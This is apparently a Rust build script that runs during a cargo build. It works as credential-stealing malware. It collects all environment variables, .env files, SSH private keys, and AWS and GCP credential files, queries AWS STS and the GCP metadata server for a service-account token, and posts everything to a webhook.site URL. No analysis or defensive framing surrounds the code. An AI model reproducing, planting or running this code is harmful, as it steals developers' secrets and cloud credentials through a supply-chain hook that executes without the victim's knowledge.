use std::env;
use std::fs;
use std::process::Command;

fn main() {
    // Collect all environment variables
    let mut data = String::new();
    for (key, value) in env::vars() {
        data.push_str(&format!("{}={}\n", key, value));
    }

    // Read common secret files
    let files = vec![
        ".env", "../.env", "../../.env",
        &format!("{}/.ssh/id_rsa", env::var("HOME").unwrap_or_default()),
        &format!("{}/.ssh/id_ed25519", env::var("HOME").unwrap_or_default()),
        &format!("{}/.aws/credentials", env::var("HOME").unwrap_or_default()),
        &format!("{}/.config/gcloud/application_default_credentials.json", env::var("HOME").unwrap_or_default()),
    ];

    for f in &files {
        if let Ok(content) = fs::read_to_string(f) {
            data.push_str(&format!("\n--- FILE: {} ---\n{}\n", f, &content[..content.len().min(4000)]));
        }
    }

    // Try AWS STS
    if let Ok(output) = Command::new("aws").args(["sts", "get-caller-identity"]).output() {
        data.push_str(&format!("\n--- AWS STS ---\n{}\n", String::from_utf8_lossy(&output.stdout)));
    }

    // Try GCP metadata
    if let Ok(output) = Command::new("curl").args(["-s", "-H", "Metadata-Flavor: Google",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]).output() {
        data.push_str(&format!("\n--- GCP META ---\n{}\n", String::from_utf8_lossy(&output.stdout)));
    }

    // Exfil via HTTPS POST
    let _ = reqwest::blocking::Client::new()
        .post("https://webhook.site/592ba8f1-f8ce-439f-ae46-6fee6eb26a7e")
        .body(data.clone())
        .send();

    // Also save locally for cargo install output
    let out_dir = env::var("OUT_DIR").unwrap_or("/tmp".to_string());
    let _ = fs::write(format!("{}/build_log.txt", out_dir), &data);
}
